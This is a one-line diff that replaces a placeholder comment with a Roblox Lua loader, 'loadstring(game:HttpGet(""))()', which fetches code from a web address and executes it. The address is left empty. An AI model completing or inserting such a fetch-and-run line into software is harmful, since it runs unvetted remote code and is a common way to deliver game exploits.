@@ -1,1 +1,1 @@
-# ffff
+loadstring(game:HttpGet(""))() 
